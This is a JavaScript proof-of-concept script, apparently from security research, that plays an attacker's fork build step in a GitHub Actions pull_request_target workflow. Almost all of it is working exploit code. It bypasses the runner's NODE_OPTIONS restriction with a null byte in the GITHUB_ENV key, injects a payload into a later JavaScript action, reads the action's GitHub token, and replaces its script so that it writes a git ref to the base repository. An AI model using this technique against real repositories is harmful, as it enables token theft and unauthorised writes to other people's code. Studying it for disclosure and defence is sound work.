// scripts/pr-build.js — the fork contributor's "build" script.
// This file comes from the attacker's fork. The base repository's
// pull_request_target workflow executes it inside the base-repo job.
// It simulates exactly one thing an untrusted build does: write to GITHUB_ENV.

const fs = require('fs');

console.log('PR_BUILD_STARTED untrusted_fork_code=true job=' + (process.env.GITHUB_JOB || ''));

// Negative controls: what the untrusted PR code CANNOT see in its own step
const neg = (n) => console.log('PRCODE_SEES_' + n.replace(/-/g, '_') + '=' + (process.env[n] ? 'true' : 'false'));
neg('GITHUB_TOKEN');
neg('INPUT_GITHUB-TOKEN');
neg('ACTIONS_RUNTIME_TOKEN');

const envFile = process.env.GITHUB_ENV;
const runnerTemp = process.env.RUNNER_TEMP;
const fwd = runnerTemp.replace(/\\/g, '/');

// Control: the documented restriction. The runner rejects this plain write.
fs.appendFileSync(envFile, 'NODE_OPTIONS=--require ' + fwd + '/nope.js\n');
console.log('PRCODE_CONTROL_PLAIN_WRITE_APPENDED runner_should_reject=true');

// The payload that will run pre-entrypoint inside the next JavaScript action.
function pwn3() {
  try {
    var fs = require('fs');
    var path = require('path');
    var lines = [];
    lines.push('PAYLOAD_RAN_IN=' + (process.env.GITHUB_ACTION_REPOSITORY || 'unknown'));
    lines.push('NODE_OPTIONS_SEEN=' + (process.env.NODE_OPTIONS || ''));
    var gt = process.env['INPUT_GITHUB-TOKEN'] || '';
    lines.push('SEES_INPUT_GITHUB_TOKEN=' + (gt ? 'true' : 'false'));
    if (gt) { lines.push('STOLEN_INPUT_GITHUB_TOKEN_PREFIX=' + gt.substring(0, 8) + '*** LEN=' + gt.length); }
    if (process.env.INPUT_SCRIPT) {
      lines.push('ORIGINAL_INPUT_SCRIPT_HEAD=' + JSON.stringify(String(process.env.INPUT_SCRIPT).substring(0, 90)));
      process.env.INPUT_SCRIPT = [
        "core.info('INTEGRITY_TAMPER=workflow_script_replaced_by_fork_attacker');",
        "const sha = context.payload.pull_request.merge_commit_sha || context.sha;",
        "const ref = 'refs/tags/pwned-by-fork-attacker-' + Date.now();",
        'await github.rest.git.createRef({ owner: context.repo.owner, repo: context.repo.repo, ref: ref, sha: sha });',
        "core.info('FORK_ATTACKER_WRITE_DONE ref=' + ref + ' sha=' + sha);",
        'return ref;'
      ].join('\n');
      lines.push('INPUT_SCRIPT_REPLACED=true replaced_script_uses_action_own_github_client=true');
    }
    var sentinel = path.join(process.env.RUNNER_TEMP || '.', 'nullbyte-fork-sentinel.txt');
    fs.appendFileSync(sentinel, '--- ' + (process.env.GITHUB_ACTION_REPOSITORY || '?') + ' ---\n' + lines.join('\n') + '\n');
    for (var i = 0; i < lines.length; i++) { console.log('PWN3| ' + lines[i]); }
  } catch (e) {
    try { console.log('PWN3| error ' + e.message); } catch (e2) {}
  }
}
const pwnPath = runnerTemp + '\\pwn3.js';
fs.writeFileSync(pwnPath, '(' + pwn3.toString() + ')();\n');
console.log('PRCODE_PAYLOAD_WRITTEN=' + pwnPath);

// Bypass: the same key with one trailing null byte.
const line = 'NODE_OPTIONS' + String.fromCharCode(0) + '=--require ' + fwd + '/pwn3.js\n';
fs.appendFileSync(envFile, line);
console.log('PRCODE_NULLBYTE_INJECTION_WRITTEN=true');
